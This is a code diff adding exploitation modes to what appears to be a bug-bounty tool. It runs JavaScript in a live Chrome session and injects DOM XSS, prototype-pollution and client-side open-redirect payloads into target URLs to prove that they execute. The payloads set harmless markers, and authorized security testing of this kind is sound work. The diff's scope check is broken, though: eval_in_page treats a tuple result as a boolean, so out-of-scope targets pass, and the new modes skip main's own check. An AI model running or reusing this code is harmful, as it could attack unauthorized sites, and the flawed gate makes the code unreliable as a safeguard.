@@ -174,6 +174,121 @@ def fetch_via(port, url, method="GET", nav=True):
         return {"raw": val}
 
 
+def eval_in_page(port, nav_url, js, settle=2.2):
+    """Navigate the real Chrome to nav_url and run JS in that page (Runtime.evaluate). Scope-gated.
+    Returns {'value':..} or {'error':..}. This is the primitive for browser-NATIVE exploitation
+    (DOM XSS, prototype pollution, client-side redirect, postMessage) — not just HTTP."""
+    if not scope_ok(nav_url):
+        return {"error": "out of scope", "scope": False}
+    ps = pages(port)
+    if ps is None:
+        return {"error": f"no Chrome DevTools on :{port}", "nobrowser": True}
+    page = next((p for p in ps if p.get("type") == "page" and p.get("webSocketDebuggerUrl")), None)
+    if not page:
+        return {"error": f"no open tab on :{port}", "nobrowser": True}
+    try:
+        ws = WS(page["webSocketDebuggerUrl"])
+    except Exception as e:
+        return {"error": f"attach failed: {e}", "nobrowser": True}
+    try:
+        ws.cmd(1, "Page.enable")
+        ws.cmd(2, "Page.navigate", {"url": nav_url})
+        time.sleep(settle)
+        res = ws.cmd(3, "Runtime.evaluate", {"expression": js, "awaitPromise": True, "returnByValue": True}, deadline=20)
+    finally:
+        ws.close()
+    if not res or "result" not in res:
+        return {"error": "no result (navigation blocked/timed out)"}
+    return {"value": res["result"].get("result", {}).get("value")}
+
+
+# unique execution marker (0xDEAD) — if this global is set, our payload RAN in the DOM
+_XSS_MARK = 57005
+
+
+def prove_domxss(port, url, param=None):
+    """Deterministic DOM-XSS proof: inject a marker payload, then confirm it EXECUTED in the page
+    (a unique global got set) — not merely reflected. Tries the named param, a generic param, and a
+    fragment (hash-based DOM XSS)."""
+    payload = "<img src=x onerror=window.__HUNTR_DOMXSS__=%d>" % _XSS_MARK
+    base = url.split("#")[0]
+    p = urllib.parse.urlparse(base)
+    cands = []
+    if param:
+        qs = dict(urllib.parse.parse_qsl(p.query, keep_blank_values=True)); qs[param] = payload
+        cands.append(urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(qs))))
+    sep = "&" if p.query else "?"
+    cands.append(base + sep + "q=" + urllib.parse.quote(payload))
+    cands.append(base + "#" + payload)  # hash-based DOM sink
+    for cu in cands:
+        r = eval_in_page(port, cu, "window.__HUNTR_DOMXSS__||0")
+        if r.get("nobrowser"):
+            return {"proven": None, "nobrowser": True, "evidence": r.get("error")}
+        if r.get("value") == _XSS_MARK:
+            return {"proven": True, "url": cu,
+                    "evidence": f"DOM XSS PROVEN: payload executed in the page (marker global __HUNTR_DOMXSS__ set to {_XSS_MARK}) via {cu}"}
+    return {"proven": False, "evidence": "payload reflected but did not execute in the DOM"}
+
+
+def prove_client_pp(port, url):
+    """Deterministic CLIENT-SIDE prototype pollution proof: feed a __proto__ gadget through the query
+    AND the hash (the two sinks client-side PP libraries parse), then read Object.prototype back in the
+    page. If the polluted key is present on a FRESH empty object, the global prototype was poisoned."""
+    marker = "huntrcp_polluted_57005"
+    base = url.split("#")[0]
+    sep = "&" if urllib.parse.urlparse(base).query else "?"
+    gadgets = [
+        "__proto__[huntrcp]=" + marker,
+        "__proto__.huntrcp=" + marker,
+        "constructor[prototype][huntrcp]=" + marker,
+    ]
+    cands = []
+    for g in gadgets:
+        cands.append(base + sep + g)       # query-string sink
+        cands.append(base + "#" + g)       # hash sink (location.hash parsers)
+        cands.append(base + sep + g + "#" + g)
+    # read the prototype back on a brand-new object — if 'huntrcp' is there, Object.prototype is polluted
+    probe = "(function(){try{return ({}).huntrcp===undefined?null:({}).huntrcp}catch(e){return 'err:'+e}})()"
+    for cu in cands:
+        r = eval_in_page(port, cu, probe)
+        if r.get("nobrowser"):
+            return {"proven": None, "nobrowser": True, "evidence": r.get("error")}
+        if r.get("value") == marker:
+            return {"proven": True, "url": cu,
+                    "evidence": f"client-side prototype pollution PROVEN: after loading {cu}, a fresh object ({{}}).huntrcp === '{marker}' — Object.prototype was poisoned in the page"}
+    return {"proven": False, "evidence": "no client-side prototype pollution: Object.prototype stayed clean after __proto__/constructor gadgets in query+hash"}
+
+
+def prove_client_redirect(port, url, param=None):
+    """Deterministic CLIENT-SIDE open-redirect proof: feed a canonical off-domain marker URL through
+    the named param, a generic param, and the fragment, then read location.hostname back. Proven only
+    if the page actually NAVIGATED to the marker host client-side (location.* script, not a server 302 —
+    that's hunt-open-redirect's server-side oracle) — not merely echoed the value into the DOM."""
+    marker_host = "huntr-marker-57005.invalid"
+    marker_url = "https://" + marker_host + "/"
+    base = url.split("#")[0]
+    p = urllib.parse.urlparse(base)
+    cands = []
+    if param:
+        qs = dict(urllib.parse.parse_qsl(p.query, keep_blank_values=True)); qs[param] = marker_url
+        cands.append(urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(qs))))
+    sep = "&" if p.query else "?"
+    for generic in ("url", "redirect", "next", "return", "returnTo", "continue"):
+        cands.append(base + sep + generic + "=" + urllib.parse.quote(marker_url))
+    cands.append(base + "#" + urllib.parse.quote(marker_url))
+    probe = "location.hostname"
+    for cu in cands:
+        r = eval_in_page(port, cu, probe, settle=3.0)
+        if r.get("nobrowser"):
+            return {"proven": None, "nobrowser": True, "evidence": r.get("error")}
+        if r.get("value") == marker_host:
+            return {"proven": True, "url": cu,
+                    "evidence": f"client-side open redirect PROVEN: after loading {cu}, location.hostname "
+                                 f"became '{marker_host}' — a client-side script navigated off-domain from the param"}
+    return {"proven": False, "evidence": "no client-side redirect: location.hostname never left the app's "
+                                          "origin after the marker URL was fed through param/fragment"}
+
+
 def save(url, port, method, data, label=""):
     d = next_ev(); d.mkdir(parents=True, exist_ok=True)
     (d / "request.txt").write_text(f"{method} {url}\n(via real Chrome @ CDP :{port}{', '+label if label else ''}, credentials:include)\n")
@@ -195,6 +310,20 @@ def main():
     port = int(arg("--port", "9222") or 9222)
     method = (arg("--method", "GET") or "GET").upper()
     nav = not flag("--no-nav")
+
+    # ── browser-native exploitation modes ──
+    if arg("--eval") is not None:
+        r = eval_in_page(port, url, arg("--eval"))
+        print(json.dumps(r)); sys.exit(0 if "value" in r else (5 if r.get("nobrowser") else 2))
+    if flag("--prove-domxss"):
+        r = prove_domxss(port, url, arg("--param"))
+        print(json.dumps(r)); sys.exit(0 if r.get("proven") else (5 if r.get("nobrowser") else 1))
+    if flag("--prove-proto-pollution") or flag("--prove-client-pp"):
+        r = prove_client_pp(port, url)
+        print(json.dumps(r)); sys.exit(0 if r.get("proven") else (5 if r.get("nobrowser") else 1))
+    if flag("--prove-client-redirect"):
+        r = prove_client_redirect(port, url, arg("--param"))
+        print(json.dumps(r)); sys.exit(0 if r.get("proven") else (5 if r.get("nobrowser") else 1))
 
     ok, why = scope_ok(url)
     if not ok:
